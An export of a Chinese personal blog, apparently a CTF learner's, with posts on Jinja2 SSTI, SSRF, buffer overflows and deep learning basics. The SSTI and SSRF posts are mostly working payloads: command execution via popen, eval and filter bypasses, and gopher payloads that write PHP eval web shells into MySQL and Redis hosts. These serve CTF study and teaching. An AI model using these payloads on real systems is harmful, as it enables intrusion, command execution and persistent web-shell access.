{"meta":{"title":"Ciallo～(∠・ω< )⌒★，欢迎来到SourceRev的个人博客","subtitle":"技术の分享","description":"lalala","author":"SourceRev","url":"http://sourcerev.github.io","root":"/"},"pages":[{"title":"","date":"2023-04-12T02:09:39.078Z","updated":"2023-04-12T01:40:13.787Z","comments":true,"path":"custom.css","permalink":"http://sourcerev.github.io/custom.css","excerpt":"","text":""}],"posts":[{"title":"SSTI模板注入","slug":"SSTI1","date":"2023-02-02T05:04:56.000Z","updated":"2023-04-12T13:26:02.107Z","comments":true,"path":"2023/02/02/SSTI1/","link":"","permalink":"http://sourcerev.github.io/2023/02/02/SSTI1/","excerpt":"","text":"SSTI当前使用的一些框架，比如python的flask，php的tp，java的spring等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。 漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。 凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。 注入思路： 1.随便找一个内置类对象用__class__拿到他所对应的类 2.用__bases__拿到基类（&lt;class ‘object’&gt;） 3.用__subclasses__()拿到子类列表 4.在子类列表中直接寻找可以利用的类getshell 对象→类→基本类→子类→__init__方法→__globals__属性→__builtins__属性→eval函数 基础知识代码块 1234变量块 &#123;&#123;&#125;&#125; 用于将表达式打印到模板输出注释块 &#123;##&#125; 注释控制块 &#123;%%&#125; 可以声明变量，也可以执行语句行声明 ## 可以有和&#123;%%&#125;相同的效果 常用的方法 12345678910111213141516171819202122232425262728__class__ 查看对象所在的类__mro__ 查看继承关系和调用顺序，返回元组__base__ 返回基类__bases__ 返回基类元组__subclasses__() 返回子类列表__init__ 调用初始化函数，可以用来跳到__globals____globals__ 返回函数所在的全局命名空间所定义的全局变量，返回字典__builtins__ 返回内建内建名称空间字典__dic__ 类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里__getattribute__() 实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如:a.xxx/a.xxx()） 都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。__getitem__() 调用字典中的键值，其实就是调用这个魔术方法，比如a[&#x27;b&#x27;]，就是a.__getitem__(&#x27;b&#x27;)__builtins__ 内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。__import__ 动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()]__str__() 返回描写这个对象的字符串，可以理解成就是打印出来。url_for flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_appget_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_applipsum flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;&#123;&#123;cycler.__init__.__globals__.os.popen(&#x27;ls&#x27;).read()&#125;&#125;current_app 应用上下文，一个全局变量request 可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/proc\\self\\fd/3&#x27;).read()request.args.x1 get传参request.values.x1 所有参数request.cookies cookies参数request.headers 请求头参数request.form.x1 post传参 (Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)request.data post传参 (Content-Type:a/b)request.json post传json (Content-Type: application/json)config 当前application的所有配置。此外，也可以这样&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125; 过滤器 1234567891011121314151617181920212223242526int() 将值转换为int类型；float() 将值转换为float类型；lower() 将字符串转换为小写；upper() 将字符串转换为大写；title() 把值中的每个单词的首字母都转成大写；capitalize() 把变量值的首字母转成大写，其余字母转小写；trim() 截取字符串前面和后面的空白字符；wordcount() 计算一个长字符串中单词的个数；reverse() 字符串反转；replace(value,old,new) 替换将old替换为new的字符串；truncate(value,length=255,killwords=False) 截取length长度的字符串；striptags() 删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；escape()或e 转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。safe() 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123;&#123;&#x27;&lt;em&gt;hello&lt;/em&gt;&#x27;|safe&#125;&#125;；list() 将变量列成列表；string() 将变量转换成字符串；join() 将一个序列中的参数值拼接成字符串。示例看上面payload；abs() 返回一个数值的绝对值；first() 返回一个序列的第一个元素；last() 返回一个序列的最后一个元素；format(value,arags,*kwargs) 格式化字符串。比如：&#123;&#123;&quot;%s&quot; - &quot;%s&quot;|format(&#x27;Hello?&#x27;,&quot;Foo!&quot;) &#125;&#125;将输出：Helloo? - Foo!length() 返回一个序列或者字典的长度；sum() 返回列表内数值的和；sort() 返回排序后的列表；default(value,default_value,boolean=false) 如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(&#x27;xiaotuo&#x27;)----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。length() 返回字符串的长度，别名是count 利用链总结 python3 直接使用 popen 12345os._wrap_close 类里有popen&#123;&#123;%27%27.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;pwd&#x27;).read()&#125;&#125;&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#x27;popen&#x27;](&#x27;whoami&#x27;).read()&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__.popen(&#x27;whoami&#x27;).read() os 使用 popen 123含有 os 的基类都可以，如 linecache&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;whoami&#x27;).read() python3 使用 __import__ 方法下的 os 123可以使用 __import__ 的 os&quot;&quot;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read() 使用 __builtins__ 汇总 123456__builtins__下有eval，__import__等的函数，可以利用此来执行命令&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;id&#x27;).read() python2 使用 file 类读文件 12345678在 python3 中 file 类被删除# 读文件[].__class__.__bases__[0].__subclasses__()[40](&#x27;etc/passwd&#x27;).read()[].__class__.__bases__[0].__subclasses__()[40](&#x27;etc/passwd&#x27;).readlines()# 写文件&quot;&quot;.__class__.__bases__[0].__bases__[0].__subclasses__()[40](&#x27;/tmp&#x27;).write(&#x27;test&#x27;)# python2的str类型不直接从属于属于基类，所以要两次 .__bases__ flask 内置函数 1234567891011Flask内置函数和内置对象可以通过&#123;&#123;self.__dict__._TemplateReference__context.keys()&#125;&#125;查看，然后可以查看一下这几个东西的类型，类可以通过__init__方法跳到os，函数直接用__globals__方法跳到os。（payload一下子就简洁了）&#123;&#123;self.__dict__._TemplateReference__context.keys()&#125;&#125;#查看内置函数#函数：lipsum、url_for、get_flashed_messages#类：cycler、joiner、namespace、config、request、session&#123;&#123;lipsum.__globals__.os.popen(&#x27;ls&#x27;).read()&#125;&#125;#函数&#123;&#123;cycler.__init__.__globals__.os.popen(&#x27;ls&#x27;).read()&#125;&#125;#类#如果要查config但是过滤了config直接用self.__dict__就能找到里面的config 通用的 getshell 12345原理就是找到含有 __builtins__ 的类，然后利用&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;#读写文件&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;filename&#x27;, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 注入基础获取可以使用的函数 1?name=&#123;&#123;%27%27.__class__.__base__.__subclasses__()&#125;&#125; 获取可以利用的字符 1?name=&#123;%print%20lipsum|select|string|list%&#125; 寻找 [] 的位置值 1234567f = open(&#x27;test.txt&#x27;, &#x27;r&#x27;)data = f.read()r = data.split(&quot;&lt;TemplateReference None&gt;&quot;)for i in range(len(r)): if &#x27;catch_warnings&#x27; in r[i]: print(i, &#x27;~~~&#x27;, r[i])f.close() 使用 lipsum 和 cycler 命令12?name=&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;tac ../flag&#x27;).read()&#125;&#125;?name=&#123;&#123;cycler.__init__.__globals__.os.popen(&#x27;ls&#x27;).read()&#125;&#125; 控制块执行1?name=&#123;% print(url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat ../flag&#x27;).read()&quot;))%&#125; 绕过方法 过滤 &#39; 和 &quot; 绕过，可以考虑使用 request.args 12?name=&#123;&#123;lipsum.__globals__.os.popen(request.args.ocean).read()&#125;&#125;&amp;ocean=cat /flag?name=&#123;&#123;url_for.__globals__[request.args.a][request.args.b](request.args.c).read()&#125;&#125;&amp;a=os&amp;b=popen&amp;c=cat /flag 上文的基础上过滤了 args values 可以获取所有参数，从而绕过 args 1?name=&#123;&#123;lipsum.__globals__.os.popen(request.values.ocean).read()&#125;&#125;&amp;ocean=cat /flag 使用 cookie 绕过 12?name=&#123;&#123;url_for.__globals__[request.cookies.a][request.cookies.b](request.cookies.c).read()&#125;&#125;a=os;b=popen;c=cat /flag 过滤 _ 绕过，可以考虑利用 filters 中的 attr 1?name=&#123;&#123;(lipsum | attr(request.values.b)).os.popen(request.values.a).read()&#125;&#125;&amp;a=cat /flag&amp;b=__globals__ 过滤 os 可以考虑使用 get 来获取 1?name=&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125;&#125;&amp;a=__globals__&amp;b=os&amp;c=cat /flag 如果只过滤了 &#123;&#123;&#125;&#125; 中的 request ，则可以使用 &#123;%print%&#125; 来绕过 1?name=&#123;%print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read() %&#125;&amp;a=__globals__&amp;b=os&amp;c=cat /flag 将 &#123;%%&#125; 中的 request 过滤后，可以构造字符串解决 脚本构造字符串 123456789101112131415import requestsurl=&quot;http://ac6e1d67-01fa-414d-8622-ab71706a7dca.chall.ctf.show:8080/?name=&#123;&#123;% print (config|string|list).pop(&#123;&#125;).lower() %&#125;&#125;&quot;payload=&quot;cat /flag&quot;result=&quot;&quot;for j in payload: for i in range(0,1000): r=requests.get(url=url.format(i)) location=r.text.find(&quot;&lt;h3&gt;&quot;) word=r.text[location+4:location+5] if word==j.lower(): print(&quot;(config|string|list).pop(%d).lower() == %s&quot;%(i,j)) result+=&quot;(config|string|list).pop(%d).lower()~&quot;%(i) breakprint(result[:len(result)-1]) 利用 set 构造字符串 1234567891011http://de1d82f0-b40d-430f-9cb5-ce2435f44306.chall.ctf.show:8080/?name=&#123;% set po=dict(po=a,p=a)|join%&#125;&#123;% set a=(()|select|string|list)|attr(po)(24)%&#125;&#123;% set ini=(a,a,dict(init=a)|join,a,a)|join()%&#125;&#123;% set glo=(a,a,dict(globals=a)|join,a,a)|join()%&#125;&#123;% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%&#125;&#123;% set built=(a,a,dict(builtins=a)|join,a,a)|join()%&#125;&#123;% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;&#123;% set chr=x.chr%&#125;&#123;% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%&#125;&#123;%print(x.open(file).read())%&#125; 过滤 数字 使用 count 和 length 获取数字 12&#123;% set one=(dict(a=a)|join|length)%&#125; # one = 1&#123;% set two=(dict(aa=a)|join|length)%&#125; # two = 2 使用 全角数字 替代 半角数字 1234567891011121314151617def half2full(half): full = &#x27;&#x27; for ch in half: if ord(ch) in range(33, 127): ch = chr(ord(ch) + 0xfee0) elif ord(ch) == 32: ch = chr(0x3000) else: pass full += ch return fullwhile 1: t = &#x27;&#x27; s = input(&quot;输入想要转换的数字字符串：&quot;) for i in s: t += half2full(i) print(t) 过滤 print ，可以使用 curl 进行外带 由于禁用了 print 导致网站不提供回显，所以可以使用 bp的collaborator curl 字符脚本 12345678910111213141516171819def half2full(half): full = &#x27;&#x27; for ch in half: if ord(ch) in range(33, 127): ch = chr(ord(ch) + 0xfee0) elif ord(ch) == 32: ch = chr(0x3000) else: pass full += ch return fullstring = input(&quot;你要输入的字符串：&quot;)result = &#x27;&#x27;def str2chr(s): global result for i in s: result += &quot;chr(&quot;+half2full(str(ord(i)))+&quot;)%2b&quot;str2chr(string)print(result[:-3])","categories":[{"name":"CTF","slug":"CTF","permalink":"http://sourcerev.github.io/categories/CTF/"}],"tags":[{"name":"web","slug":"web","permalink":"http://sourcerev.github.io/tags/web/"},{"name":"SSTI","slug":"SSTI","permalink":"http://sourcerev.github.io/tags/SSTI/"}]},{"title":"SSRF","slug":"SSRF1","date":"2023-01-08T18:23:56.000Z","updated":"2023-04-12T12:20:25.482Z","comments":true,"path":"2023/01/09/SSRF1/","link":"","permalink":"http://sourcerev.github.io/2023/01/09/SSRF1/","excerpt":"","text":"SSRFSSRF意为服务端请求伪造(Server Side Request Forge)。攻击者利用SSRF漏洞通过服务器发起伪造请求，这样就可以访问内网的数据，进行内网信息探测或者内网漏洞利用。 SSRF漏洞形成的原因是：应用程序存在可以从其他服务器获取数据的功能，但是对服务器的地址并没有做严格的过滤，导致应用程序可以访问任意的URL链接。攻击者通过精心构造URL链接 例如（ctfshow web352）： 12345678910111213141516171819202122&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;if(!preg_match(&#x27;/localhost|127.0.0/&#x27;))&#123;$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);&#125;else&#123; die(&#x27;hacker&#x27;);&#125;&#125;else&#123; die(&#x27;hacker&#x27;);&#125;?&gt; 此时我们可以构造 payload url&#x3D;http://localhost/flag.php PS. 可以进制转换绕过 127.0.0.1 &#x3D;&#x3D;&gt; 0177.0.0.1 (八进制) 首先，我们必须要知道一个函数 parse_url 12345678910111213141516&lt;?php $url = &#x27;http://username:password@hostname/path?arg=value#anchor&#x27;; print_r(parse_url($url)); echo parse_url($url, PHP_URL_PATH);?&gt;结果------------------------------Array( [scheme] =&gt; http [host] =&gt; hostname // [user] =&gt; username @前 [pass] =&gt; password @前 [path] =&gt; /path / [query] =&gt; arg=value ?以后的key=value [fragment] =&gt; anchor #以后的部分) 关键字绕过 对于 (preg_match(&#39;/localhost|1|0|。/i&#39;, $url) ，可以使用 sudo.cc 代替 127.0.0.1 1payload : url=http://sudo.cc/flag.php 对于 preg_match(&#39;/^http:\\/\\/ctf\\..*show$/i&#39;,$url ，相当于post值必须要为 http://ctf.*show 12payload : url=http://ctf.@127.0.0.1/flag.php#show url=http://ctf.@127.0.0.1/flag.php?show 长度限制 若 (strlen($host)&lt;=5 ，可以考虑 127.1 1payload : url=http://127.1/flag.php 若 (strlen($host)&lt;=3 ，可以考虑 0 1url=http://0/flag.php 绕过验证器gethostbyname ：返回主机名对应的 IPv4地址。 FILTER_VALIDATE_IP ： 过滤器把值作为 IP 地址来验证（如果成功，则返回被过滤的数据；如果失败，则返回 FALSE）： FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）。 FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）。 FILTER_FLAG_NO_PRIV_RANGE - 要求值不在 RFC 指定的私有范围 IP 内（比如 192.168.0.1）。 FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。 12345保留地址主要在以下四类：A类：10.0.0.0－10.255.255.255（长度相当于1个A类IP地址） 100.64.0.0－100.127.255.255B类：172.16.0.0－172.31.255.255（长度相当于16个连续的B类IP地址）C类：192.168.0.0－192.168.255.255（长度相当于256个连续的C类IP地址） 绕过方式：可以使用公网ip的服务器，脚本如下 123&lt;?php header(&quot;Location:http://127.0.0.1/flag.php&quot;); ?&gt; Gopher协议Gopher协议是internet的一个信息查找系统，俗称万能协议，可以通过gopher访问对应计算机上的其他资源，例如利用gopher实现：GET请求，POST请求，内网的redis，mysql(以及各类关系型数据库)未授权访问，以及MongoDB，Memcache等。 gopher协议数据格式：gopher:&#x2F;&#x2F;ip:port&#x2F;_TCP&#x2F;IP数据流 打无密码的mysql工具：https://github.com/tarunkant/Gopherus.git 指令如下： 123python2 gopherus.py --exploit mysqlrootselect &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;/var/www/html/1.php&quot; 结果： 12gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%01%00%00%00%01# 可能需要对端口号后面的数据进行二次url加密 最后进行蚁剑连接即可 攻击redits123python2 gopherus.py --exploit mysqlPHPShell&lt;?php eval($_POST[&#x27;1&#x27;]);?&gt; payload: 12url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2430%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B%271%27%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A# 不需要二次url加密","categories":[{"name":"CTF","slug":"CTF","permalink":"http://sourcerev.github.io/categories/CTF/"}],"tags":[{"name":"web","slug":"web","permalink":"http://sourcerev.github.io/tags/web/"},{"name":"SSRF","slug":"SSRF","permalink":"http://sourcerev.github.io/tags/SSRF/"}]},{"title":"缓冲区溢出","slug":"pwn_overflow","date":"2022-12-20T18:23:56.000Z","updated":"2023-04-12T12:12:37.358Z","comments":true,"path":"2022/12/21/pwn_overflow/","link":"","permalink":"http://sourcerev.github.io/2022/12/21/pwn_overflow/","excerpt":"","text":"PWN入门在CTF中，pwn主要是指通过程序本身的漏洞，编写利用脚本破解程序拿到系统的权限（shell），从而获得flag（通常为目标目录下文件内的一段随机字符串）这就要求我们对程序的各种函数，内存地址，堆栈空间，文件的结构有足够的了解。 缓冲区溢出基础知识GOT表Globle offset table 全局偏移量表，位于数据段，是一个每个条目是8字节地址的数组，用来存储外部函数在内存的确切地址，GOT表存储在数据段，（在IDA中是也就是.data段）可以在程序运行中被修改。 hijack GOT： 修改某一个被调用函数的地址，让其指向另一个函数，例如修改printf()函数的地址让其指向system(),这样做的结果就是原本对于printf()的调用就变成了调用system()函数。 PLT表procedure linkage table 过程连接表，位于代码段，是一个每个条目是16字节内容的数组。其中PLT[0]储存的信息能用来跳转到动态链接器中，PLT 是系统启动函数（__libc_start_main）,其余每个条目都负责调用一个具体的函数。 用来存储外部函数的入口点，换而言之程序总会到PLT这里寻找外部函数的地址。 总结：plt表里是got表的地址got表是函数的真实地址。程序还未执行时，got表里还是plt表的地址，我们需要泄漏got表里的地址， 若程序开启了ASLR，本地和远程的地址不一样，但也只是针对于地址中间位进行随机，最低的12位并不会发生改变，也就是我们需要获取到远程环境的函数的真实地址，进而判断libc的版本，计算泄漏的函数got表的地址与system的偏移，然后获取到system函数的真实地址，进而计算system函数与&#x2F;bin&#x2F;sh的偏移，最终getshell 基础语法1234# 检查文件的基本信息file stack1# 检查名为stack1的二进制文件是否开启保护checksec --file=stack1 格式化字符串漏洞类似c语言的 printf ，sprintf ，snprintf 等格式化字符串用于接收可变参数，当程序编写不规范时： 正确写法：printf(“%s”,string) 错误写法：printf(string) 出现类似的情况时，就会出现格式话字符串漏洞 利用方式构造一个payload来寻找输入字符串到栈顶指针的偏移，然后利用找到的偏移，在偏移处填入目的地址可以实现目的地址的内容泄露以及内容改写。 例如 [第五空间2019 决赛]PWN5： 12345678910111213141516171819202122232425262728293031323334353637int __cdecl main(int a1)&#123; unsigned int v1; // eax int result; // eax int fd; // [esp+0h] [ebp-84h] char nptr[16]; // [esp+4h] [ebp-80h] BYREF char buf[100]; // [esp+14h] [ebp-70h] BYREF unsigned int v6; // [esp+78h] [ebp-Ch] int *v7; // [esp+7Ch] [ebp-8h] v7 = &amp;a1; v6 = __readgsdword(0x14u); setvbuf(stdout, 0, 2, 0); v1 = time(0); srand(v1); fd = open(&quot;/dev/urandom&quot;, 0); read(fd, &amp;dword_804C044, 4u); printf(&quot;your name:&quot;); read(0, buf, 0x63u); printf(&quot;Hello,&quot;); printf(buf); printf(&quot;your passwd:&quot;); read(0, nptr, 0xFu); if ( atoi(nptr) == dword_804C044 ) &#123; puts(&quot;ok!!&quot;); system(&quot;/bin/sh&quot;); &#125; else &#123; puts(&quot;fail&quot;); &#125; result = 0; if ( __readgsdword(0x14u) != v6 ) sub_80493D0(); return result;&#125; 由于其功能是从 /dev/urandom 文件读取一个随机数，比对输入的 passwd 是否与该随机数一致，一致则getshell，而 printf 函数没有设定格式化参数，与输入的 passwd 比较的数字的地址也可以看到是 0x804C044，因此可以利用格式化字符串漏洞，在第一次输入 name 的时候修改 0x804C044 的内容，第二次输入 passwd 时输入改内容（字符串格式，用 str 函数，其参数为16进制数字）","categories":[{"name":"CTF","slug":"CTF","permalink":"http://sourcerev.github.io/categories/CTF/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://sourcerev.github.io/tags/pwn/"}]},{"title":"深度学习基础","slug":"deeplearning","date":"2022-11-16T05:23:56.000Z","updated":"2023-04-12T13:10:47.093Z","comments":true,"path":"2022/11/16/deeplearning/","link":"","permalink":"http://sourcerev.github.io/2022/11/16/deeplearning/","excerpt":"","text":"感知机定义：感知机接收多个输入信号，输出一个信号。 $x_1$、$x_2$是输入信号， $y$是输出信号，$w_1$、$w_2$是权重。输入信号被送往神经元时，会被分别乘以固定的权重$(w_1x_1、w_2x_2)$。 神经元会计算传送过来的信号的总和，只有当这个总和超过 了某个界限值时，才会输出1。这也称为“神经元被激活”。这里将这个界限值称为阈值，用符号$θ$表示。 数学表示 感知机的多个输入信号都有各自固有的权重，这些权重发挥着控制各个 信号的重要性的作用。也就是说，权重越大，对应该权重的信号的重要性就越高。 简单实现感知机（门的实现） 1234567def AND(x1, x2): w1, w2, theta = 0.5, 0.5, 0.7 tmp = x1*w1 + x2*w2 if tmp &lt;= theta: return 0 else: return 1 导入权重与偏置首先把上面式子的$θ$换成$−b$，于 是就可以用新的式子来表示感知机的行为。 式子中虽然有一个符号不同，但表达的内容是完全相同的。 此处，$b$称为偏置，$w_1$和$w_2$称为权重。感知机会计算输入信号和权重的乘积，然后加上偏置，如果这个值大于0则输出1，否则输出0。 门的实现 123456789101112131415161718192021222324&#x27;&#x27;&#x27;代码实现的是与门，非门（NAND）和或门（OR）只需要将权重与偏置量进行变化即可&#x27;&#x27;&#x27;def AND(x1, x2): x = np.array([x1, x2]) w = np.array([0.5, 0.5]) b = -0.7 # w = np.array([-0.5, -0.5]) # 非门 # b = 0.7 # 非门 # w = np.array([0.5, 0.5]) # 非门 # b = -0.2 # 非门 tmp = np.sum(w*x) + b if tmp &lt;= 0: return 0 else: return 1&#x27;&#x27;&#x27;异或门实现&#x27;&#x27;&#x27;def XOR(x1, x2): s1 = NAND(x1, x2) s2 = OR(x1, x2) y = AND(s1, s2) return y 神经网络我们现在将式子改写成更加简洁的形式 输入信号的总和会被函数$h(x)$转换，转换后的值就是输出y。 然后，式子所表示的函数$h(x)$，在输入超过0时返回1，否则返回0。 激活函数刚才登场的$h(x)$函数会将输入信号的总和转换为输出信号，这些函数就被称为激活函数。激活函数的作用在于决定如何来激活输入信号的总和。 sigmoid函数 其中的exp(−x)表示e^{−x}的意思 神经网络中用sigmoid函数作为激活函数，进行信号的转换，转换后的信号被传送给下一个神经元。 函数实现 12def sigmoid(x): return 1 / (1 + np.exp(-x)) 图像表示 12345x = np.arange(-5.0, 5.0, 0.1)y = sigmoid(x)plt.plot(x, y)plt.ylim(-0.1, 1.1) # 指定y轴的范围plt.show() 阶跃函数阶跃函数如式3所示，当输入超过0时，输出1， 否则输出0。 Python实现 1234567891011# 只支持实数范围内的数据def step_function(x): if x &gt; 0: return 1 else: return 0 # 支持numpy的函数def step_function(x): y = x &gt; 0 # y的结果是一个储存比较结果的布尔数组 return y.astype(np.int) 图像表示 123456789import numpy as npimport matplotlib.pylab as pltdef step_function(x): return np.array(x &gt; 0, dtype=np.int)x = np.arange(-5.0, 5.0, 0.1)y = step_function(x)plt.plot(x, y)plt.ylim(-0.1, 1.1) # 指定y轴的范围plt.show() 两种激活函数比较不同点 函数名称 图像呈现方式 变化节点 返回值 sigmoid 平滑的曲线 随着输入发生连续性的变化 实数 阶跃函数 由直线构成 以0为界，输出发生急剧变化 0和1二元信号 共同点 输入值越大越接近1，越小越接近0。而为了发挥叠加层所带来的优势，激活函数必须使用非线性函数。 ReLU函数 实现 123def relu(x): return np.maximum(0, x)# maximum函数会从输入的数值中选择较大的那个值进行输出 三层神经网络的实现12345678910111213141516171819202122232425def init_network(): network = &#123;&#125; network[&#x27;W1&#x27;] = np.array([[0.1, 0.3, 0.5], [0.2, 0.4, 0.6]]) network[&#x27;b1&#x27;] = np.array([0.1, 0.2, 0.3]) network[&#x27;W2&#x27;] = np.array([[0.1, 0.4], [0.2, 0.5], [0.3, 0.6]]) network[&#x27;b2&#x27;] = np.array([0.1, 0.2]) network[&#x27;W3&#x27;] = np.array([[0.1, 0.3], [0.2, 0.4]]) network[&#x27;b3&#x27;] = np.array([0.1, 0.2]) return networkdef forward(network, x): W1, W2, W3 = network[&#x27;W1&#x27;], network[&#x27;W2&#x27;], network[&#x27;W3&#x27;] b1, b2, b3 = network[&#x27;b1&#x27;], network[&#x27;b2&#x27;], network[&#x27;b3&#x27;] a1 = np.dot(x, W1) + b1 z1 = sigmoid(a1) a2 = np.dot(z1, W2) + b2 z2 = sigmoid(a2) a3 = np.dot(z2, W3) + b3 y = identity_function(a3) return ynetwork = init_network()x = np.array([1.0, 0.5])y = forward(network, x)print(y) # [0.31682708 0.69627909] 这里定义了 init_network() 和 forward() 函数。init_network() 函数会进行权重和偏置的初始化，并将它们保存在字典变量 network 中。这个字典变量 network 中保存了每一层所需的参数（权重和偏置）。forward() 函数中则封 装了将输入信号转换为输出信号的处理过程。 机器学习的问题大致可以分为分类问题和回归问题 分类问题：数据属于哪一个类别的问题，比如：判断男生还是女生的问题 回归问题：根据某个输入预测一个数值，比如：根据一个人的图像预测这个人的体重 